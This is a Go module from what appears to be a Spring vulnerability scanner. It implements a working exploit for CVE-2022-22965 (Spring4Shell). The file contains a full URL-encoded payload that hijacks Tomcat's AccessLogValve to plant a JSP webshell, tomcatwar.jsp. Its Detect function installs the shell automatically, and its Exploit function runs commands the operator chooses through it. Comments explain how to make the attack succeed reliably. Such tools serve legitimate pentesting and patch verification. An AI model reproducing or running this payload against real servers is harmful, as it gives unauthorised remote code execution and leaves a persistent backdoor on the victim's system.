package vulns

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/dlclark/regexp2"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2022-22965 Spring Framework RCE（Spring4Shell / SpringShell）。
// 通过 Tomcat AccessLogValve 写入 tomcatwar.jsp 后执行命令。
//
// 实测要点（均为对 v1 的修复，v1 在 vulhub 该环境下从未成功过）：
//  1. 绑定必须走 GET 查询参数——该环境的控制器对 POST 返回 405，绑定从未发生；
//  2. pattern 用 Runtime.exec(String) 单字符串形态：bash -c 数组形态含
//     []{} 字面量，Tomcat 对请求行中的这些字符直接返回 400；
//  3. fileDateFormat= 必须保留：AccessLogValve 运行期改写 pattern/prefix
//     并不会重开日志文件，只有 setFileDateFormat 触发 writer 重开，JSP 才落地；
//  4. c1/c2/suffix 头必须与绑定请求同源——valve 记录该条请求时才把
//     %{c1}i/%{c2}i/%{suffix}i 还原为头值，否则占位处是 "-"，JSP 无法编译；
//  5. JSP 首次访问要等 Jasper 编译，需数秒重试窗口。
type cve202222965 struct{}

func init() { Register(&cve202222965{}) }

const (
	s4aPatternPrefix = "class.module.classLoader.resources.context.parent.pipeline.first."
	s4aShellPath     = "tomcatwar.jsp"
	s4aOutputRe      = `[^/]+(?=//)`
	s4aDetectMarker  = "sspv2shell"
	s4aAttempts      = 15
	s4aRetryWait     = 2 * time.Second // 仿真环境下 Jasper 编译可能超过 30s
)

// s4aHeaders 既是普通请求头，也是 pattern 占位的取值来源：
// valve 记录本条请求时把 %{c1}i/%{c2}i/%{suffix}i 还原为这三个头的值。
var s4aHeaders = map[string]string{
	"suffix": "%>//",
	"c1":     "Runtime",
	"c2":     "<%",
}

// s4aBindQuery 为 GET 查询形态的完整绑定载荷（与 vulhub 官方 PoC 一致）。
var s4aBindQuery = "?" + s4aPatternPrefix +
	`pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&` +
	s4aPatternPrefix + `suffix=.jsp&` +
	s4aPatternPrefix + `directory=webapps/ROOT&` +
	s4aPatternPrefix + `prefix=tomcatwar&` +
	s4aPatternPrefix + `fileDateFormat=`

func (c *cve202222965) Info() model.Info {
	return model.Info{
		ID:         "CVE-2022-22965",
		Name:       "Spring Framework RCE（Spring4Shell）",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Framework 5.3.0-5.3.17 / 5.2.0-5.2.19（JDK9+ 且部署于 Tomcat）",
		Reference:  "https://spring.io/security/cve-2022-22965",
		HasExploit: true,
		ArgHint:    "要执行的命令（exec 单字符串形态，按空格分词，不支持引号/管道）",
	}
}

// installShell 发送绑定请求写入 WebShell。
func (c *cve202222965) installShell(ctx context.Context, t model.Target) error {
	if _, _, err := do(ctx, t, http.MethodGet, s4aBindQuery, s4aHeaders, ""); err != nil {
		return err
	}
	time.Sleep(1 * time.Second)
	return nil
}

// cleanupPattern 按官方建议把 pattern 置空：否则目标每个请求都会向
// WebShell 追加一段 JSP 代码，文件迅速膨胀。完整恢复需重启 Tomcat。
func (c *cve202222965) cleanupPattern(ctx context.Context, t model.Target) {
	_, _, _ = do(ctx, t, http.MethodGet, "?"+s4aPatternPrefix+"pattern=", nil, "")
}

func (c *cve202222965) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	if err := c.installShell(ctx, t); err != nil {
		return nil, err
	}

	// JSP 首次访问需等 Jasper 编译（数秒），重试窗口内轮询标记。
	// 请求超时/404（如 WebFlux 网关环境将请求代理至外网）静默判负，不抛模块错误。
	var lastErr error
	for i := 0; i < s4aAttempts; i++ {
		resp, body, err := do(ctx, t, http.MethodGet,
			s4aShellPath+"?pwd=j&cmd=echo%20"+s4aDetectMarker, s4aHeaders, "")
		if err != nil {
			lastErr = err
			time.Sleep(s4aRetryWait)
			continue
		}
		lastErr = nil
		if resp.StatusCode == http.StatusOK && strings.Contains(string(body), s4aDetectMarker) {
			v.Vulnerable = true
			v.Evidence = t.URL + s4aShellPath + "?pwd=j&cmd=<command>"
			v.Detail = "WebShell 已写入（echo 标记回显确认），命令经 Runtime.exec 单字符串执行"
			break
		}
		if resp.StatusCode == http.StatusNotFound {
			v.Detail = "WebShell 未生成（可能非 WAR 部署的 Tomcat 或 binding 被拒）"
			break
		}
		time.Sleep(s4aRetryWait)
	}
	if !v.Vulnerable && lastErr != nil {
		v.Detail = "WebShell 请求超时/无响应（目标可能将请求代理至外部网络）"
	}
	c.cleanupPattern(ctx, t)
	return v, nil
}

func (c *cve202222965) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	if err := c.installShell(ctx, t); err != nil {
		return "", "", err
	}

	path := s4aShellPath + "?pwd=j&cmd=" + url.QueryEscape(arg)

	var lastBody []byte
	for i := 0; i < s4aAttempts; i++ {
		resp, body, err := do(ctx, t, http.MethodGet, path, s4aHeaders, "")
		if err != nil {
			return "", "", err
		}
		_ = resp
		lastBody = body

		// 命令输出位于 "//" 标记之前
		re := regexp2.MustCompile(s4aOutputRe, 0)
		if m, _ := re.FindStringMatch(string(body)); m != nil {
			c.cleanupPattern(ctx, t)
			return m.String(), "", nil
		}
		if len(body) > 0 && !strings.Contains(string(body), "Whitelabel") {
			c.cleanupPattern(ctx, t)
			return string(body), "未能定位 // 回显标记，已返回原始响应", nil
		}
		time.Sleep(s4aRetryWait)
	}
	c.cleanupPattern(ctx, t)
	return string(lastBody), "重试后仍未取得回显（JSP 编译可能未完成）", nil
}
